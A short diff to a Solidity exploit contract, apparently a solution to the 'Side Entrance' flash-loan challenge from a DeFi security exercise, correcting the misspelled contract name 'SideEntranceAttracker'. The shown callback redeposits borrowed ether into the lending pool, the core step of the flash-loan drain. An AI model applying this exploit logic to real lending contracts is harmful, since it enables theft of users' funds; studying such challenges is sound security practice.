@@ -6,7 +6,7 @@ interface IFlashLoanEtherReceiver {
     function execute() external payable;
 }
 
-contract SideEntranceAttracker is IFlashLoanEtherReceiver {
+contract SideEntranceAttacker is IFlashLoanEtherReceiver {
     // flashloan callback
     function execute() external payable override {
         (bool isSuccess,) = msg.sender.call{value: msg.value}(abi.encodeWithSignature("deposit()"));
